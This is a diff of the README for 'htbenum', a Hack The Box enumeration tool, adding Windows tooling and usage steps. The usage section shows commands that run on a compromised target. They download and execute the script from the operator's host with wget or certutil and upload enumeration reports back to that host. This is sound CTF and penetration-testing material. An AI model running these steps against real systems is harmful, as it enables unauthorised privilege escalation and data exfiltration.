@@ -1,24 +1,22 @@
 # htbenum
-*A Linux enumeration script for Hack The Box*
+*An enumeration script for Hack The Box*
 
-![GitHub](https://img.shields.io/github/license/SolomonSklash/htbenum.svg?style=flat-square)
-![Github language](https://img.shields.io/github/languages/top/SolomonSklash/htbenum.svg?style=flat-square)
-![GitHub issues](https://img.shields.io/github/issues/SolomonSklash/htbenum.svg?style=flat-square)
-![Github contributors](https://img.shields.io/github/contributors/SolomonSklash/htbenum.svg?style=flat-square)
-
-This script is designed for use in situations where you do not have internet access on a Linux host and would like to run enumeration and exploit suggestion scripts, such as Hack The Box. I find myself running a similar set of scripts when I get an initial foothold on a Linux box, and this script helps automate the process of downloading the latest version of each enumeration script, making it executable, and running it, as well as sending output to a file for later review. It also has a builtin web server to host the tools and upload reports back to the host machine.
-
-**Pull requests/suggestions welcome!**
+This script is designed for use in situations where you do not have internet access on a target host and would like to run enumeration and exploit suggestion scripts, such as Hack The Box. 
 
 ![](screenshot01.png)
 
 ### Features
-* 5 different enumeration scripts, including:
+* Multiple enumeration scripts, including:
     * [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration/)
     * [LinEnum](https://github.com/rebootuser/LinEnum/)
     * [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/)
     * [uptux](https://github.com/initstring/uptux)
     * [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
+    * [PEASS-ng](https://github.com/peass-ng/PEASS-ng)
+    * [Privesc](https://github.com/enjoiz/Privesc)
+    * [WindowsPrivEscCheck](https://github.com/pentestmonkey/windows-privesc-check/)
+    * [JAWS](https://github.com/411Hall/JAWS/)
+    * [Sherlock](https://github.com/rasta-mouse/Sherlock)
 * 2 different exploit suggestion tools, including:
     * [linux-soft-exploit-suggester](https://github.com/belane/linux-soft-exploit-suggester)
     * [LES: Linux privilege escalation auditing tool](https://github.com/mzet-/linux-exploit-suggester)
@@ -27,6 +25,9 @@ This script is designed for use in situations where you do not have internet acc
 * Custom directory option, for when you know you have access to a specific directory (default is /tmp)
 * Interactive menu lets you choose whether to run only enumeration, only expoit suggestion, or both
 * Checks for Python 2 and 3 and lets you know which scripts will be skipped if Python is missing
+* Checks if certutil or Powershell is installed for Windows host enumeration
+
+TODO: Complete Windows Enumeration Automation
 
 ### Usage
 ```
@@ -83,10 +84,16 @@ Then, start the builtin web server to host the tools and receive the completed r
 root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w
 ```
 
-Finally, upload the `htbenum.sh` script to your target machine, make it executable, and run it with the IP and port of your host machine, with an optional directory for downloading files and writing report output. You can also optionally upload the reports back to the host machine. For example:
+For Linux, upload the `htbenum.sh` script to your target machine, make it executable, and run it with the IP and port of your host machine, with an optional directory for downloading files and writing report output. You can also optionally upload the reports back to the host machine. For example:
 ```
 www-data@htb:/tmp$ wget http://10.10.99.100/htbenum.sh -O /tmp/htbenum.sh
 www-data@htb:/tmp$ chmod +x ./htbenum.sh
 www-data@htb:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r
 ```
+For Windows, upload the `htbenum.bat` script to your target machine, and run it with the IP and port of your host machine. For example:
+```
+C:\Windows\Temp>certutil -urlcache -split -f 'http://10.10.99.100/htbenum.bat htbenum.bat'
+C:\Windows\Temp>.\htbenum.bat 10.10.14.1 80
+```
+
 Each tool will send its output to a report file in the same directory as the `htbenum.sh` script, or whatever directory is specified by the `-d` parameter.
